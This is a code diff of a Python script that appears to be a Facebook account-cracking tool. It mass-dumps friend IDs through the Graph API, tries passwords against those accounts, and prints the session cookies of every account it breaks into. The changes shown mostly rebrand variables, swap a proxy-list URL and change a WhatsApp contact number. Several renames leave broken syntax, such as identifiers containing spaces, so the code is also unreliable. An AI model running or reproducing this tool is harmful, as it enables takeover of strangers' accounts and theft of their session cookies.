@@ -38,15 +38,15 @@ ua = [
 
 ugen2 = []
 ugen = []
-cokbrut = []
+RAHULbrut = []
 ses = requests.Session()
 princp = []
 try:
-    prox = requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
-    open('.prox.txt', 'w').write(prox)
+    prox = requests.get('https://github.com/Rahullslam/RAHULBOSS2023/blob/main/Approval.txt').text
+    open('.Approval.txt', 'w').write(prox)
 except Exception as e:
     pass
-prox = open('.prox.txt', 'r').read().splitlines()
+prox = open('.Approval.txt', 'r').read().splitlines()
 for xd in range(10000):
     a = 'Mozilla/5.0 (Symbian/3; Series60/'
     b = random.randrange(1, 9)
@@ -106,21 +106,21 @@ for x in range(10):
 
 def uaku():
     try:
-        ua = open('bbnew.txt', 'r').read().splitlines()
+        ua = open('Approval.txt', 'r').read().splitlines()
         for ub in ua:
             ugen.append(ub)
     except:
         a = requests.get('https://github.com/Rahullslam/RAHULBOSS2023/blob/main/Approval.txt').text
-        ua = open('bbnew.txt', 'w')
+        ua = open('Approval.txt', 'w')
         aa = re.findall('line">(.*?)<', str(a))
         for un in aa:
             ua.write(un + '\n')
-        ua = open('bbnew.txt', 'r').read().splitlines()
+        ua = open('Approval.txt', 'r').read().splitlines()
 
 
 # ------------[ INDICATION ]---------------#
 id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, RAHUL ku, uid, lisensikuni = [], [], 0, 0, 0, [], [], [], [], [], [], [], []
-cokbrut = []
+RAHULbrut = []
 pwpluss, pwnya = [], []
 
 # ------------[ Cyber- ]--------------#
@@ -231,11 +231,11 @@ pass
 def login():
     try:
         RAHUL  = open('.RAHUL .txt', 'r').read()
-        cok = open('.cok.txt', 'r').read()
+        RAHUL = open('.RAHUL.txt', 'r').read()
         RAHUL ku.append(RAHUL )
         try:
             sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_RAHUL =' + RAHUL ku[0],
-                              cookies={'cookie': cok})
+                              cookies={'cookie': RAHUL})
             sy2 = json.loads(sy.text)['name']
             sy3 = json.loads(sy.text)['id']
             menu(sy2, sy3)
@@ -257,7 +257,7 @@ def login_lagi334():
 
     except Exception as e:
         os.system("rm -f .RAHUL .txt")
-        os.system("rm -f .cok.txt")
+        os.system("rm -f .RAHUL.txt")
         os.system("python nono.py")
         exit()
 
@@ -305,7 +305,7 @@ def menu():
     elif CYBER in ['1']:
         crack_file()
     elif CYBER in ['2', '02']:
-        os.system('xdg-open https://wa.me/+8801927763964')
+        os.system('xdg-open https://wa.me/+01767853679')
         os.system("python nono.py")
     elif CYBER in ['3', '03']:
         result()
@@ -454,7 +454,7 @@ def result():
 def dump_massal():
     try:
         RAHUL  = open('.RAHUL .txt', 'r').read()
-        cok = open('.cok.txt', 'r').read()
+        RAHUL = open('.RAHUL.txt', 'r').read()
     except IOError:
         exit()
     try:
@@ -479,7 +479,7 @@ def dump_massal():
        # try:
             col = ses.get(
                 'https://graph.facebook.com/v2.0/' + userr + '?fields=friends.limit(5000)&access_RAHUL =' + RAHUL ku[0],
-                cookies={'cookies': cok}).json()
+                cookies={'cookies': RAHUL}).json()
             for mi in col['friends']['data']:
                 try:
                     iso = (mi['id'] + '|' + mi['name'])
@@ -704,7 +704,7 @@ def crack(idf, pwv):
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok += 1
-                coki = po.cookies.get_dict()
+                RAHULi = po.cookies.get_dict()
                 kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                 print(f'\r\033[0;92m[Cyber-Army💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                 os.system('espeak -a 300 " Cyber,  Ok,  id"')
@@ -765,7 +765,7 @@ def crackfree(idf, pwv):
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok += 1
-                coki = po.cookies.get_dict()
+                RAHULi = po.cookies.get_dict()
                 kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                 print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Cyber-Ok] {idf} • {pw} ')
                 os.system('espeak -a 300 " Ok,  Cyber,  id"')
@@ -791,7 +791,7 @@ if __name__ == '__main__':
     except:
         pass
     try:
-        os.system('RAHUL.prox.txt')
+        os.system('RAHUL.txt')
     except:
         pass
 menu()
